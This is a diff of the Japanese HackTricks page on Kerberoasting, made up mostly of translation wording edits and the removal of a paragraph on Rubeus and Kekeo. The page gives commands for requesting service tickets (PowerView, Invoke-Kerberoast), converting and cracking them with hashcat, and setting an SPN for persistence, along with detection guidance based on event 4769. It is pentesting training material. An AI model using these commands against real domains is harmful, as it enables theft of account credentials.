@@ -1,9 +1,9 @@
 # Kerberoast（Kerberoasting）
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
 今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -12,28 +12,28 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
 ## Kerberoast（Kerberoasting）
 
-**Kerberoasting（Kerberoast）**の目的は、AD内でユーザーアカウントの代わりに実行されるサービスのために動作する**TGSチケットを収集**することです。したがって、これらのTGSチケットの一部は、ユーザーパスワードから派生したキーで**暗号化**されています。その結果、これらの資格情報はオフラインで**クラック**される可能性があります。\
+**Kerberoasting（Kerberoast）**の目的は、AD内でユーザーアカウントの代わりに実行されるサービスのための**TGSチケットを収集**することです。したがって、これらのTGSチケットの一部は、ユーザーパスワードから派生したキーで**暗号化**されています。その結果、これらの資格情報はオフラインで**クラック**される可能性があります。\
 ユーザーアカウントがサービスとして使用されていることを知ることができるのは、プロパティ**"ServicePrincipalName"**が**nullでない**場合です。
 
 したがって、Kerberoastingを実行するには、特権は必要ありませんので、TGSを要求できるドメインアカウントのみが必要です。
 
-**有効なドメイン内の資格情報が必要です。**
+**ドメイン内の有効な資格情報が必要です。**
 
 ### **攻撃**
 
 {% hint style="warning" %}
 **Kerberoastingツール**は、攻撃を実行し、TGS-REQリクエストを開始する際に、通常**`RC4暗号化`**を要求します。これは、**RC4が**[**弱い**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)ためであり、Hashcatなどのツールを使用して他の暗号化アルゴリズム（AES-128やAES-256など）よりもオフラインで簡単にクラックできるからです。\
-RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。
+RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。`
 {% endhint %}
 
 #### **Linux**
@@ -67,7 +67,7 @@ Get-NetUser -SPN | select serviceprincipalname #Powerview
 
 攻撃者は、まずターゲットのユーザーのTGT（Ticket Granting Ticket）を取得します。次に、TGTを使用してTGSを要求し、そのTGSをメモリからダンプします。このダンプには、攻撃者が後でオフラインで解析できるTGSの暗号化された情報が含まれています。
 
-このテクニックを成功させるためには、攻撃者はターゲットのユーザーの資格情報を取得する必要があります。これは、パスワードのハッシュをクラックするなどの手法を使用して行われる場合があります。
+このテクニックを成功させるためには、攻撃者はターゲットのユーザーの資格情報を取得する必要があります。これは、パスワードのハッシュをクラックするなどの手法を使用して行うことができます。
 
 このテクニックは、攻撃者がActive Directory環境に侵入し、特権アクセスを取得するための重要な手法です。
 ```powershell
@@ -90,16 +90,6 @@ python2.7 kirbi2john.py sqldev.kirbi
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
 * **テクニック2: 自動ツール**
-
-自動ツールを使用することも、Kerberoasting攻撃を実行するための効果的な方法です。これらのツールは、攻撃者が手動で行う必要がある多くの手順を自動化し、攻撃の効率を向上させます。
-
-以下は、いくつかの一般的な自動ツールの例です。
-
-- Rubeus: Rubeusは、Kerberosチケットの取得とKerberoasting攻撃を自動化するための強力なツールです。このツールは、Active Directory環境で使用されるKerberosチケットを取得し、攻撃者が攻撃対象のサービスアカウントのTGSチケットを抽出するのに役立ちます。
-
-- Kekeo: Kekeoは、Kerberos認証プロトコルを操作するための強力なツールです。このツールは、攻撃者がKerberosチケットを取得し、Kerberoasting攻撃を実行するのに役立ちます。
-
-これらのツールは、攻撃者がKerberoasting攻撃を簡単かつ迅速に実行できるようにするため、非常に便利です。ただし、これらのツールを使用する前に、適切な許可を取得し、法的な制約を遵守することが重要です。
 ```bash
 # Powerview: Get Kerberoast hash of a user
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
@@ -119,10 +109,10 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 TGSが要求されると、Windowsイベント`4769 - Kerberosサービスチケットが要求されました`が生成されます。
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
 今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -135,22 +125,22 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### 持続性
 
-ユーザーに対して**十分な権限**がある場合、それを**Kerberoast可能**にすることができます。
+ユーザーに対して**十分な権限**がある場合、それを**kerberoastable**にすることができます。
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 以下は、**kerberoast** 攻撃に役立つ**ツール**のリンクです: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-もしLinuxで次の**エラー**が表示された場合: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** それはローカルの時刻が原因です。ホストとドメインコントローラーを同期する必要があります。以下のオプションがあります:
+もしLinuxで次の**エラー**が表示された場合: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** それはローカルの時刻が原因です。ホストとドメインコントローラーの時刻を同期する必要があります。以下のオプションがあります:
 
 * `ntpdate <ドメインコントローラーのIP>` - Ubuntu 16.04以降では非推奨
 * `rdate -n <ドメインコントローラーのIP>`
 
 ### 緩和策
 
-Kerberoast は、攻撃可能な場合に非常に潜在的です。
+Kerberoastは、攻撃可能な場合に非常に潜在的です。
 
-* セキュリティイベントID 4769 – Kerberosチケットの要求がありました
+* セキュリティイベントID 4769 – Kerberosチケットが要求されました
 * 4769は非常に頻繁なので、結果をフィルタリングしましょう:
 * サービス名はkrbtgtではないこと
 * サービス名は$で終わらないこと（サービス用のマシンアカウントをフィルタリングするため）
@@ -169,7 +159,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
@@ -177,7 +167,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**することができます。
